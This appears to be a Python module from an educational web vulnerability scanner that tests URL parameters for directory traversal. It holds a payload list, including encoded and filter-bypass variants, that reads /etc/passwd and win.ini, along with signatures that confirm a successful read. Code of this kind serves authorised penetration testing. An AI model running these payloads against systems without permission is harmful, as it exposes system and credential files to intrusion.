"""
Module: dir_traversal.py
OWASP  : A01:2021 – Broken Access Control
Purpose: Test URL parameters for directory/path traversal vulnerabilities.
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode

HEADERS = {"User-Agent": "WebVulnScanner/1.0 (Educational Pentest Tool)"}

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..\\..\\windows\\win.ini",
    "../../windows/win.ini",
]

TRAVERSAL_SIGNATURES = [
    "root:x:0:0",       # Linux /etc/passwd
    "[boot loader]",    # Windows win.ini
    "[extensions]",     # Windows win.ini
    "daemon:x:",        # /etc/passwd
]

FILE_PARAMS = ["file", "path", "page", "include", "doc", "template",
               "dir", "load", "read", "open", "filename", "view"]


def test_directory_traversal(urls, timeout=5):
    """Test URL parameters that look like file paths for traversal."""
    vulns = []
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            continue

        for param, values in params.items():
            # Focus on params with file-like names or values
            is_file_param = (
                param.lower() in FILE_PARAMS or
                any(c in (values[0] if values else "") for c in ["/", "\\", "."])
            )
            if not is_file_param:
                continue

            for payload in TRAVERSAL_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(query=urlencode(test_params)).geturl()

                try:
                    resp = requests.get(test_url, headers=HEADERS,
                                        timeout=timeout, verify=False)
                    if any(sig in resp.text for sig in TRAVERSAL_SIGNATURES):
                        vulns.append({
                            "url":     test_url,
                            "param":   param,
                            "payload": payload,
                            "detail":  (
                                f"Directory traversal in parameter '{param}'. "
                                f"System file content visible in response."
                            )
                        })
                        break
                except Exception:
                    pass
    return vulns
